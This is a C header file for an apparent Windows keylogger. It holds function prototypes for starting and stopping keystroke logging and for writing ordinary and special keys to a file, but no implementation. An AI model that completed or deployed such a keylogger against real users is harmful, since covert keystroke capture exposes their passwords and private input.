#include <stdio.h>

#ifndef WIN_KEYLOG_H
#define WIN_KEYLOG_H

void WriteHeader(const char* filePath);
void WriteIntoFile(char data, const char* file);
void WriteSpecialKeyIntoFile(char *data, const char* file);
char* SpecialKeyToReadable(int data);
int isSpecialKey(char data);
void windows_keylog(const char* file);
void end_keylog(const char* filePath);

#endif // WIN_KEYLOG_H